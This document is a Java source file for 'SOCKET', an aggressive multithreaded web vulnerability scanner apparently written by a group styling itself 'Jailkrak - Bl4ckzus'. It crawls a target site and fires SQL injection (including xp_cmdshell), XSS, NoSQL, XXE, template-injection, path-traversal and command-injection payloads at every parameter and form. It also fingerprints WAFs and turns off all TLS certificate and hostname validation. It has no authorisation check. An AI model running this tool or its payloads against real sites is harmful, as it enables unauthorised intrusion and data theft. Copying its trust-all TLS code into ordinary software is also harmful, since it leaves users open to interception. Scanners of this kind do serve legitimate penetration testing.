import javax.net.ssl.*;
import java.io.*;
import java.net.*;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * ============================================================================
 * ||                                                                         ||
 * ||     SSSS   OOO   CCCC  K   K  EEEEE  TTTTT  EEEEE  RRRR                 ||
 * ||     S     O   O C      K  K   E        T    E      R   R                ||
 * ||     SSS   O   O C      KKK    EEEE     T    EEEE   RRRR                 ||
 * ||        S  O   O C      K  K   E        T    E      R R                  ||
 * ||     SSSS   OOO   CCCC  K   K  EEEEE    T    EEEEE  R  RR                ||
 * ||                                                                         ||
 * ||     =================================================================   ||
 * ||        SOCKET VULNERABILITY TESTER v3.0 - POWER EDITION                 ||
 * ||        SQLi | XSS | NoSQL | XXE | SSTI | Path Traversal                ||
 * ||        WAF Bypass | Multi-Threading | API Testing                      ||
 * ||        Author: Jailkrak - Bl4ckzus                                     ||
 * ||     =================================================================   ||
 * ||                                                                         ||
 * ============================================================================
 */
public class SOCKET {

    private static final String VERSION = "3.0.0";
    private static final String BANNER = 
        "\n" +
        "====================================\n" +
        "        SOCKET - Version 3.0        \n" +
        "         Jailkrak - Bl4ckzus        \n" +
        "====================================\n" +
        "\n" +
        "[+] Advanced Security Scanner Loaded\n" +
        "[+] SQLi | XSS | NoSQL | XXE | SSTI | Path Traversal\n" +
        "[+] Multi-threading | WAF Bypass | API Testing\n" +
        "[+] Starting vulnerability assessment...\n\n";
    
    // ============================================================
    // CONFIGURATION
    // ============================================================
    public static class ScannerConfig {
        int threads = 30;
        int crawlDepth = 3;
        int timeoutMs = 10000;
        int maxPages = 500;
        boolean followRedirects = true;
        boolean testForms = true;
        boolean testJSON = true;
        boolean testXML = true;
        boolean blindSqlInjection = true;
        boolean timeBasedBlind = true;
        boolean aggressive = true;
        String proxyHost = null;
        int proxyPort = 8080;
        String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        List<String> cookies = new ArrayList<>();
        Map<String, String> customHeaders = new HashMap<>();
        int delayMs = 100;
        String outputFormat = "html";
        String outputFile = "scan_report";
        boolean verbose = false;
        int maxRetries = 3;
        List<String> excludePatterns = new ArrayList<>();
        List<String> includePatterns = new ArrayList<>();
    }
    
    private ScannerConfig config;
    private ConcurrentHashMap<String, Boolean> visitedUrls = new ConcurrentHashMap<>();
    private ConcurrentLinkedQueue<String> urlQueue = new ConcurrentLinkedQueue<>();
    private ConcurrentLinkedQueue<Vulnerability> findings = new ConcurrentLinkedQueue<>();
    private AtomicInteger pagesScanned = new AtomicInteger(0);
    private AtomicInteger totalRequests = new AtomicInteger(0);
    private AtomicInteger totalErrors = new AtomicInteger(0);
    private ExecutorService executorService;
    private String baseDomain;
    private String wafSignature = "unknown";
    private long scanStartTime;
    private long scanEndTime;
    
    // SSL trust-all
    static {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[]{new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
                public X509Certificate[] getAcceptedIssuers() { return null; }
            }}, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        } catch (Exception e) {}
    }
    
    // ============================================================
    // VULNERABILITY MODEL
    // ============================================================
    public static class Vulnerability {
        public String type, subtype, url, parameter, payload, evidence, severity, description, remediation;
        public double cvssScore;
        public LocalDateTime timestamp;
        
        public Vulnerability(String type, String subtype, String url, String parameter,
                            String payload, String evidence, String severity, double cvssScore,
                            String description, String remediation) {
            this.type = type; this.subtype = subtype; this.url = url; this.parameter = parameter;
            this.payload = payload; this.evidence = evidence; this.severity = severity;
            this.cvssScore = cvssScore; this.description = description; this.remediation = remediation;
            this.timestamp = LocalDateTime.now();
        }
    }
    
    // ============================================================
    // ENHANCED PAYLOADS
    // ============================================================
    
    static final String[][] SQLI_PAYLOADS = {
        {"'", "SQL syntax|MySQL|MariaDB|You have an error"},
        {"\"", "SQL syntax|MySQL|You have an error"},
        {"' OR '1'='1", "Table|column|select|from|where"},
        {"' OR 1=1-- -", "Table|column|select|from|where"},
        {"' UNION SELECT NULL-- -", "UNION|NULL|column"},
        {"' AND 1=CONVERT(int, @@version)-- -", "Conversion failed|Microsoft|SQL Server"},
        {"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -", "XPATH|~"},
        {"' AND SLEEP(5)-- -", "SLEEP|delay"},
        {"' WAITFOR DELAY '0:0:5'--", "WAITFOR|delay"},
        {"' AND PG_SLEEP(5)-- -", "PG_SLEEP"},
        {"'; EXEC xp_cmdshell('dir')--", "xp_cmdshell|Directory"},
        {"1' ORDER BY 1000-- -", "ORDER BY|column"},
    };
    
    static final String[] XSS_PAYLOADS = {
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)",
        "';alert(1);//",
        "\";alert(1);//",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
    };
    
    static final String[] NOSQL_PAYLOADS = {
        "{$ne: null}",
        "{$gt: ''}",
        "{$regex: '.*'}",
        "' || '1'=='1",
        "'; return true; var foo='",
        "{$where: '1==1'}",
        "';sleep(5000);var foo='",
    };
    
    static final String[] XXE_PAYLOADS = {
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
    };
    
    static final String[] SSTI_PAYLOADS = {
        "{{7*7}}", "${7*7}", "{{config}}", "<%= 7*7 %>", "*{7*7}",
    };
    
    static final String[] PATH_TRAVERSAL = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
    };
    
    static final String[] LFI_PAYLOADS = {
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../windows/win.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
    };
    
    static final String[] COMMAND_INJECTION = {
        "; ls -la",
        "| ls -la",
        "&& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; dir",
        "| dir",
        "&& dir",
    };
    
    static final String[] LDAP_PAYLOADS = {
        "*",
        "*)(&",
        "*)(uid=*",
        "admin*",
        "admin*)((|userPassword=*)",
    };
    
    static final String[][] BOOLEAN_PAYLOADS = {
        {"' AND '1'='1", "' AND '1'='2"},
        {"' OR '1'='1", "' OR '1'='2"},
        {"1 AND 1=1", "1 AND 1=2"},
        {"' AND 1=1-- -", "' AND 1=0-- -"},
    };
    
    static final Map<String, String> WAF_SIG = new HashMap<String, String>() {{
        put("Cloudflare", "cloudflare|cf-ray|__cfduid");
        put("ModSecurity", "ModSecurity|mod_security");
        put("AWS WAF", "awswaf|AWSALB");
        put("F5 ASM", "F5|BIG-IP|ASM");
        put("Akamai", "akamai|AKA|ak_bmsc");
        put("Imperva", "imperva|Incapsula");
        put("Sucuri", "sucuri|Sucuri");
    }};
    
    public SOCKET(ScannerConfig config) {
        this.config = config;
        this.executorService = Executors.newFixedThreadPool(config.threads);
    }
    
    // ============================================================
    // HTTP ENGINE
    // ============================================================
    
    public HttpResponse sendRequest(String url, String method, Map<String, String> params,
                                     Map<String, String> headers, String body) {
        totalRequests.incrementAndGet();
        HttpURLConnection conn = null;
        
        try {
            if (config.delayMs > 0) Thread.sleep(config.delayMs);
            
            String fullUrl = url;
            if ("GET".equalsIgnoreCase(method) && params != null && !params.isEmpty()) {
                StringBuilder qs = new StringBuilder(url.contains("?") ? "&" : "?");
                for (Map.Entry<String, String> e : params.entrySet()) {
                    qs.append(URLEncoder.encode(e.getKey(), "UTF-8"))
                      .append("=").append(URLEncoder.encode(e.getValue(), "UTF-8"))
                      .append("&");
                }
                fullUrl = url + qs.substring(0, qs.length() - 1);
            }
            
            URL obj = new URL(fullUrl);
            conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestProperty("User-Agent", config.userAgent);
            conn.setRequestProperty("Accept", "*/*");
            conn.setRequestProperty("Connection", "keep-alive");
            
            if (config.proxyHost != null) {
                System.setProperty("http.proxyHost", config.proxyHost);
                System.setProperty("http.proxyPort", String.valueOf(config.proxyPort));
            }
            
            if (!config.cookies.isEmpty()) {
                conn.setRequestProperty("Cookie", String.join("; ", config.cookies));
            }
            
            if (headers != null) {
                for (Map.Entry<String, String> e : headers.entrySet()) {
                    conn.setRequestProperty(e.getKey(), e.getValue());
                }
            }
            
            conn.setConnectTimeout(config.timeoutMs);
            conn.setReadTimeout(config.timeoutMs);
            conn.setInstanceFollowRedirects(config.followRedirects);
            
            if ("POST".equalsIgnoreCase(method) && body != null) {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
            }
            
            int responseCode = conn.getResponseCode();
            detectWAF(conn);
            
            StringBuilder responseBody = new StringBuilder();
            try (InputStream is = responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()) {
                if (is != null) {
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                        String line;
                        while ((line = br.readLine()) != null) {
                            responseBody.append(line).append("\n");
                        }
                    }
                }
            }
            
            return new HttpResponse(responseCode, responseBody.toString());
            
        } catch (Exception e) {
            totalErrors.incrementAndGet();
            return new HttpResponse(0, "");
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
    
    public static class HttpResponse {
        public int code;
        public String body;
        public HttpResponse(int code, String body) { this.code = code; this.body = body; }
        public boolean isSuccess() { return code >= 200 && code < 300; }
        public int length() { return body != null ? body.length() : 0; }
    }
    
    private void detectWAF(HttpURLConnection conn) {
        if (!"unknown".equals(wafSignature)) return;
        for (Map.Entry<String, List<String>> h : conn.getHeaderFields().entrySet()) {
            if (h.getKey() == null) continue;
            String value = String.join(" ", h.getValue()).toLowerCase();
            for (Map.Entry<String, String> waf : WAF_SIG.entrySet()) {
                if (value.contains(waf.getValue().toLowerCase())) {
                    wafSignature = waf.getKey();
                    System.out.println("[!] WAF Detected: " + wafSignature);
                    return;
                }
            }
        }
    }
    
    // ============================================================
    // CRAWLER
    // ============================================================
    
    public void startCrawl(String seedUrl) {
        scanStartTime = System.currentTimeMillis();
        baseDomain = extractDomain(seedUrl);
        System.out.println(BANNER);
        System.out.println("[*] Target: " + seedUrl);
        System.out.println("[*] Domain: " + baseDomain);
        System.out.println("[*] Threads: " + config.threads + " | Max Pages: " + config.maxPages);
        System.out.println("[*] Starting scan...\n");
        
        urlQueue.add(seedUrl);
        
        for (int depth = 0; depth < config.crawlDepth && !urlQueue.isEmpty(); depth++) {
            int urlCount = urlQueue.size();
            List<Future<?>> futures = new ArrayList<>();
            
            for (int i = 0; i < Math.min(urlCount, config.maxPages - pagesScanned.get()); i++) {
                String url = urlQueue.poll();
                if (url == null || visitedUrls.putIfAbsent(url, true) != null) continue;
                if (pagesScanned.get() >= config.maxPages) break;
                
                final String targetUrl = url;
                futures.add(executorService.submit(() -> {
                    try { crawlPage(targetUrl); } catch (Exception e) {}
                }));
            }
            
            for (Future<?> f : futures) {
                try { f.get(30, TimeUnit.SECONDS); } catch (Exception e) {}
            }
        }
        
        scanEndTime = System.currentTimeMillis();
        System.out.println("\n[+] Scan completed in " + (scanEndTime - scanStartTime) / 1000 + "s");
        System.out.println("[+] Pages: " + pagesScanned.get() + " | Requests: " + totalRequests.get());
        System.out.println("[+] Vulnerabilities: " + findings.size());
    }
    
    private void crawlPage(String url) {
        HttpResponse resp = sendRequest(url, "GET", null, null, null);
        if (resp.code == 0) return;
        
        pagesScanned.incrementAndGet();
        String html = resp.body;
        if (html == null) return;
        
        // Extract links
        Pattern linkPattern = Pattern.compile("<a\\s+[^>]*href\\s*=\\s*['\"]([^'\"]+)['\"]", Pattern.CASE_INSENSITIVE);
        Matcher matcher = linkPattern.matcher(html);
        while (matcher.find()) {
            String link = normalizeUrl(url, matcher.group(1));
            if (link != null && link.contains(baseDomain) && !visitedUrls.containsKey(link)) {
                urlQueue.add(link);
            }
        }
        
        // Test parameters
        extractAndTestParams(url);
        
        // Test forms
        if (config.testForms) extractAndTestForms(html, url);
        
        // Test API endpoints
        if (config.testJSON && (url.contains(".json") || url.contains("/api/"))) testJSONEndpoint(url);
        if (config.testXML && url.contains(".xml")) testXMLEndpoint(url);
    }
    
    private String normalizeUrl(String base, String href) {
        try {
            if (href == null || href.isEmpty()) return null;
            if (href.startsWith("#") || href.startsWith("javascript:")) return null;
            if (href.startsWith("http")) return href;
            if (href.startsWith("//")) return "https:" + href;
            URI baseUri = new URI(base);
            URI resolved = baseUri.resolve(href);
            String result = resolved.toString();
            int idx = result.indexOf('#');
            return idx > 0 ? result.substring(0, idx) : result;
        } catch (Exception e) { return null; }
    }
    
    private String extractDomain(String url) {
        try {
            String host = new URI(url).getHost();
            return host != null ? host.replace("www.", "") : url;
        } catch (Exception e) { return url; }
    }
    
    // ============================================================
    // FORM TESTING
    // ============================================================
    
    private void extractAndTestForms(String html, String pageUrl) {
        String[] formParts = html.split("(?i)<form");
        for (int i = 1; i < formParts.length; i++) {
            String form = formParts[i].split("(?i)</form>")[0];
            String action = extractAttr(form, "action");
            String method = extractAttr(form, "method");
            if (action == null || action.isEmpty()) action = pageUrl;
            action = normalizeUrl(pageUrl, action);
            if (action == null) continue;
            
            List<FormField> fields = extractFields(form);
            for (FormField field : fields) {
                if ("hidden".equals(field.type) || "submit".equals(field.type)) continue;
                testSQLiForm(action, method, fields, field);
                testXSSForm(action, method, fields, field);
            }
        }
    }
    
    static class FormField { String name, type, value; }
    
    private String extractAttr(String block, String attr) {
        Pattern p = Pattern.compile(attr + "\\s*=\\s*['\"]([^'\"]*)['\"]", Pattern.CASE_INSENSITIVE);
        Matcher m = p.matcher(block);
        return m.find() ? m.group(1) : null;
    }
    
    private List<FormField> extractFields(String formBlock) {
        List<FormField> fields = new ArrayList<>();
        Pattern p = Pattern.compile("<(?:input|textarea|select)\\s[^>]*>", Pattern.CASE_INSENSITIVE);
        Matcher m = p.matcher(formBlock);
        while (m.find()) {
            String tag = m.group();
            FormField f = new FormField();
            f.name = extractAttr(tag, "name");
            f.type = extractAttr(tag, "type");
            f.value = extractAttr(tag, "value");
            if (f.name != null) fields.add(f);
        }
        return fields;
    }
    
    private void testSQLiForm(String action, String method, List<FormField> fields, FormField target) {
        for (String[] payload : SQLI_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            for (FormField f : fields) {
                params.put(f.name, f.name.equals(target.name) ? payload[0] : "test");
            }
            String body = buildPostBody(params);
            HttpResponse resp = sendRequest(action, method, 
                "GET".equalsIgnoreCase(method) ? params : null, null,
                "POST".equalsIgnoreCase(method) ? body : null);
            
            if (resp.body != null && Pattern.compile(payload[1], Pattern.CASE_INSENSITIVE).matcher(resp.body).find()) {
                addVuln("SQL Injection", "error-based", action, target.name, payload[0], 
                       "SQL error: " + payload[1], "CRITICAL", 9.8);
            }
        }
    }
    
    private void testXSSForm(String action, String method, List<FormField> fields, FormField target) {
        for (String payload : XSS_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            for (FormField f : fields) {
                params.put(f.name, f.name.equals(target.name) ? payload : "test");
            }
            String body = buildPostBody(params);
            HttpResponse resp = sendRequest(action, method,
                "GET".equalsIgnoreCase(method) ? params : null, null,
                "POST".equalsIgnoreCase(method) ? body : null);
            
            if (resp.body != null && resp.body.contains(payload)) {
                addVuln("XSS", "reflected", action, target.name, payload,
                       "Payload reflected", "HIGH", 7.4);
            }
        }
    }
    
    // ============================================================
    // PARAMETER TESTING
    // ============================================================
    
    private void extractAndTestParams(String url) {
        if (!url.contains("?")) return;
        String base = url.substring(0, url.indexOf('?'));
        String query = url.substring(url.indexOf('?') + 1);
        
        for (String pair : query.split("&")) {
            String[] kv = pair.split("=", 2);
            if (kv.length >= 1) {
                testSQLiParam(base, kv[0]);
                testXSSParam(base, kv[0]);
                testNoSQLParam(base, kv[0]);
                testCommandInjection(base, kv[0]);
                testPathTraversal(base, kv[0]);
                testLFI(base, kv[0]);
                testSSTI(base, kv[0]);
            }
        }
    }
    
    private void testSQLiParam(String base, String param) {
        // Error-based
        for (String[] payload : SQLI_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload[0]);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && Pattern.compile(payload[1], Pattern.CASE_INSENSITIVE).matcher(resp.body).find()) {
                addVuln("SQL Injection", "error-based", base, param, payload[0], 
                       "SQL error: " + payload[1], "CRITICAL", 9.8);
                return;
            }
        }
        
        // Boolean blind
        if (config.blindSqlInjection) {
            for (String[] pair : BOOLEAN_PAYLOADS) {
                Map<String, String> p1 = new HashMap<>(); p1.put(param, pair[0]);
                Map<String, String> p2 = new HashMap<>(); p2.put(param, pair[1]);
                HttpResponse r1 = sendRequest(base, "GET", p1, null, null);
                HttpResponse r2 = sendRequest(base, "GET", p2, null, null);
                if (Math.abs(r1.length() - r2.length()) > 50) {
                    addVuln("SQL Injection", "boolean-blind", base, param, pair[0],
                           "Difference: " + Math.abs(r1.length() - r2.length()) + " bytes", "HIGH", 7.5);
                    return;
                }
            }
        }
        
        // Time-based
        if (config.timeBasedBlind) {
            String[] timePayloads = {"' AND SLEEP(5)-- -", "' WAITFOR DELAY '0:0:5'--", "' AND PG_SLEEP(5)-- -"};
            for (String payload : timePayloads) {
                Map<String, String> params = new HashMap<>();
                params.put(param, payload);
                long start = System.currentTimeMillis();
                sendRequest(base, "GET", params, null, null);
                if (System.currentTimeMillis() - start >= 4000) {
                    addVuln("SQL Injection", "time-blind", base, param, payload,
                           "Delay detected", "HIGH", 8.2);
                    return;
                }
            }
        }
    }
    
    private void testXSSParam(String base, String param) {
        for (String payload : XSS_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && resp.body.contains(payload)) {
                addVuln("XSS", "reflected", base, param, payload,
                       "Payload reflected", "HIGH", 7.4);
                return;
            }
        }
    }
    
    private void testNoSQLParam(String base, String param) {
        for (String payload : NOSQL_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && (resp.body.contains("MongoError") || resp.body.contains("$ne"))) {
                addVuln("NoSQL Injection", "operator", base, param, payload,
                       "NoSQL error detected", "CRITICAL", 9.0);
                return;
            }
        }
    }
    
    private void testCommandInjection(String base, String param) {
        for (String payload : COMMAND_INJECTION) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && (resp.body.contains("root:") || resp.body.contains("bin/bash") ||
                resp.body.contains("Volume") || resp.body.contains("Directory"))) {
                addVuln("Command Injection", "OS", base, param, payload,
                       "Command output detected", "CRITICAL", 9.8);
                return;
            }
        }
    }
    
    private void testPathTraversal(String base, String param) {
        for (String payload : PATH_TRAVERSAL) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && (resp.body.contains("root:") || resp.body.contains("[extensions]"))) {
                addVuln("Path Traversal", "LFI", base, param, payload,
                       "File content detected", "HIGH", 7.8);
                return;
            }
        }
    }
    
    private void testLFI(String base, String param) {
        for (String payload : LFI_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && (resp.body.contains("root:") || resp.body.contains("[extensions]"))) {
                addVuln("LFI", "file-inclusion", base, param, payload,
                       "File content detected", "CRITICAL", 9.0);
                return;
            }
        }
    }
    
    private void testSSTI(String base, String param) {
        for (String payload : SSTI_PAYLOADS) {
            Map<String, String> params = new HashMap<>();
            params.put(param, payload);
            HttpResponse resp = sendRequest(base, "GET", params, null, null);
            if (resp.body != null && resp.body.contains("49")) {
                addVuln("SSTI", "template", base, param, payload,
                       "Math evaluation: 49", "CRITICAL", 9.3);
                return;
            }
        }
    }
    
    // ============================================================
    // API TESTING
    // ============================================================
    
    private void testJSONEndpoint(String url) {
        for (String[] payload : SQLI_PAYLOADS) {
            String jsonBody = "{\"test\":\"" + payload[0] + "\"}";
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/json");
            HttpResponse resp = sendRequest(url, "POST", null, headers, jsonBody);
            if (resp.body != null && Pattern.compile(payload[1], Pattern.CASE_INSENSITIVE).matcher(resp.body).find()) {
                addVuln("SQL Injection", "JSON", url, "body", payload[0],
                       "SQL error in JSON", "CRITICAL", 9.5);
            }
        }
    }
    
    private void testXMLEndpoint(String url) {
        for (String payload : XXE_PAYLOADS) {
            Map<String, String> headers = new HashMap<>();
            headers.put("Content-Type", "application/xml");
            HttpResponse resp = sendRequest(url, "POST", null, headers, payload);
            if (resp.body != null && (resp.body.contains("root:") || resp.body.contains("etc/passwd"))) {
                addVuln("XXE", "XML External Entity", url, "body", payload,
                       "File content detected", "CRITICAL", 9.1);
            }
        }
    }
    
    // ============================================================
    // UTILITIES
    // ============================================================
    
    private String buildPostBody(Map<String, String> params) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : params.entrySet()) {
            try {
                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
                  .append("=").append(URLEncoder.encode(e.getValue(), "UTF-8"))
                  .append("&");
            } catch (Exception ex) {}
        }
        return sb.length() > 0 ? sb.substring(0, sb.length() - 1) : "";
    }
    
    private void addVuln(String type, String subtype, String url, String param, 
                         String payload, String evidence, String severity, double cvss) {
        Vulnerability v = new Vulnerability(type, subtype, url, param, payload, evidence, severity, cvss, "", "");
        findings.add(v);
        System.out.println("[!] " + severity + " - " + type + " found in " + url + "?" + param + "=" + payload);
        System.out.println("    Evidence: " + evidence + "\n");
    }
    
    // ============================================================
    // REPORT
    // ============================================================
    
    public void generateReport() {
        try (PrintWriter pw = new PrintWriter(config.outputFile + ".html")) {
            pw.println("<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Scan Report</title>");
            pw.println("<style>body{font-family:Arial;margin:20px}.critical{color:red}.high{color:orange}");
            pw.println("table{border-collapse:collapse;width:100%}th,td{border:1px solid #ddd;padding:8px}");
            pw.println("th{background:#f2f2f2}</style></head><body>");
            pw.println("<h1>SOCKET Vulnerability Scan Report</h1>");
            pw.println("<p>Scan Date: " + LocalDateTime.now() + "</p>");
            pw.println("<p>Target: " + baseDomain + "</p>");
            pw.println("<p>Pages: " + pagesScanned.get() + " | Requests: " + totalRequests.get() + "</p>");
            pw.println("<p>WAF: " + wafSignature + "</p>");
            pw.println("<h2>Vulnerabilities (" + findings.size() + ")</h2>");
            
            if (!findings.isEmpty()) {
                pw.println("<table><tr><th>Severity</th><th>Type</th><th>URL</th><th>Parameter</th><th>Payload</th></tr>");
                for (Vulnerability v : findings) {
                    pw.println("<tr><td class='" + v.severity.toLowerCase() + "'>" + v.severity + "</td>");
                    pw.println("<td>" + v.type + " (" + v.subtype + ")</td>");
                    pw.println("<td>" + escapeHtml(v.url) + "</td>");
                    pw.println("<td>" + escapeHtml(v.parameter) + "</td>");
                    pw.println("<td><code>" + escapeHtml(v.payload) + "</code></td></tr>");
                }
                pw.println("</table>");
            } else {
                pw.println("<p>No vulnerabilities found.</p>");
            }
            pw.println("</body></html>");
            System.out.println("[+] Report saved: " + config.outputFile + ".html");
        } catch (Exception e) {}
        
        printSummary();
    }
    
    private void printSummary() {
        System.out.println("\n========================================");
        System.out.println("           SCAN SUMMARY");
        System.out.println("========================================");
        System.out.println("  Duration: " + (scanEndTime - scanStartTime) / 1000 + "s");
        System.out.println("  Pages: " + pagesScanned.get());
        System.out.println("  Requests: " + totalRequests.get());
        System.out.println("  Errors: " + totalErrors.get());
        System.out.println("  WAF: " + wafSignature);
        System.out.println("  Vulnerabilities: " + findings.size());
        
        if (!findings.isEmpty()) {
            Map<String, Integer> bySeverity = new HashMap<>();
            for (Vulnerability v : findings) {
                bySeverity.put(v.severity, bySeverity.getOrDefault(v.severity, 0) + 1);
            }
            System.out.println("\n  By Severity:");
            for (Map.Entry<String, Integer> e : bySeverity.entrySet()) {
                System.out.println("    " + e.getKey() + ": " + e.getValue());
            }
        }
        System.out.println("========================================\n");
    }
    
    private String escapeHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }
    
    public void shutdown() {
        executorService.shutdown();
        try { executorService.awaitTermination(30, TimeUnit.SECONDS); } catch (Exception e) {}
    }
    
    // ============================================================
    // MAIN
    // ============================================================
    
    public static void main(String[] args) {
        ScannerConfig config = new ScannerConfig();
        
        if (args.length == 0) {
            printHelp();
            return;
        }
        
        String target = null;
        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "-u": case "--url":
                    if (i + 1 < args.length) target = args[++i];
                    break;
                case "-t": case "--threads":
                    if (i + 1 < args.length) config.threads = Integer.parseInt(args[++i]);
                    break;
                case "-d": case "--depth":
                    if (i + 1 < args.length) config.crawlDepth = Integer.parseInt(args[++i]);
                    break;
                case "-m": case "--max-pages":
                    if (i + 1 < args.length) config.maxPages = Integer.parseInt(args[++i]);
                    break;
                case "--proxy":
                    if (i + 1 < args.length) {
                        String[] p = args[++i].split(":");
                        config.proxyHost = p[0];
                        if (p.length > 1) config.proxyPort = Integer.parseInt(p[1]);
                    }
                    break;
                case "--cookie":
                    if (i + 1 < args.length) config.cookies.add(args[++i]);
                    break;
                case "-o": case "--output":
                    if (i + 1 < args.length) config.outputFile = args[++i];
                    break;
                case "-v": case "--verbose":
                    config.verbose = true;
                    break;
                case "-h": case "--help":
                    printHelp();
                    return;
            }
        }
        
        if (target == null) {
            System.out.println("[!] Error: No target specified!\n");
            printHelp();
            return;
        }
        
        SOCKET scanner = new SOCKET(config);
        scanner.startCrawl(target);
        scanner.generateReport();
        scanner.shutdown();
    }
    
    private static void printHelp() {
        System.out.println("\nSOCKET - Advanced Vulnerability Scanner v3.0");
        System.out.println("================================================");
        System.out.println("Usage: java SOCKET -u <url> [options]\n");
        System.out.println("Options:");
        System.out.println("  -u, --url <url>        Target URL");
        System.out.println("  -t, --threads <num>    Threads (default: 30)");
        System.out.println("  -d, --depth <num>      Crawl depth (default: 3)");
        System.out.println("  -m, --max-pages <num>  Max pages (default: 500)");
        System.out.println("  --proxy <host:port>    HTTP proxy");
        System.out.println("  --cookie <cookie>      Add cookie");
        System.out.println("  -o, --output <file>    Output file (default: scan_report)");
        System.out.println("  -v, --verbose          Verbose output");
        System.out.println("  -h, --help             This help\n");
        System.out.println("Examples:");
        System.out.println("  java SOCKET -u https://example.com");
        System.out.println("  java SOCKET -u https://example.com -t 50 -d 5 -v");
        System.out.println("  java SOCKET -u https://example.com --proxy 127.0.0.1:8080\n");
    }
}